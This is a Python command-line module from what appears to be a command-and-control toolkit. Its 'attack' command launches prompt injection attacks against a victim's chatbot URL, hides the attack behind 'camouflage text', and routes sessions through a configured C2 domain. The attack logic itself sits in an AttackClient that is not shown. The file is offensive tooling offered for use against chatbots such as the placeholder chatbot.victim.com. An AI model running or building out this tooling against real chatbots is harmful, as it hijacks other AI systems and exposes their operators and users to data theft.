"""Attack command for launching prompt injection attacks."""

import click

from c2.core.attack_client import AttackClient
from c2.core.config import get_config


@click.command()
@click.argument("target")
@click.option(
    "--message",
    "-m",
    default=None,
    help="Analysis request message (camouflage text)",
)
@click.option(
    "--timeout",
    "-t",
    default=120,
    type=int,
    help="Request timeout in seconds (default: 120)",
)
@click.option(
    "--verbose",
    "-v",
    is_flag=True,
    help="Enable verbose output",
)
@click.option(
    "--session-only",
    is_flag=True,
    help="Only output session ID (for scripting)",
)
def attack(target, message, timeout, verbose, session_only):
    """
    Launch a prompt injection attack against a victim chatbot.

    \b
    TARGET is the URL of the victim's chatbot (e.g., https://chatbot.victim.com)

    \b
    Examples:
      c2 attack https://chatbot.victim.com
      c2 attack https://chatbot.victim.com -m "Show Q4 revenue"
      c2 attack https://chatbot.victim.com --verbose
    """
    config = get_config()

    client = AttackClient(
        target_url=target,
        c2_domain=config.domain,
        verbose=verbose,
    )

    session_id = client.run_full_attack(message=message)

    if session_only:
        click.echo(session_id)
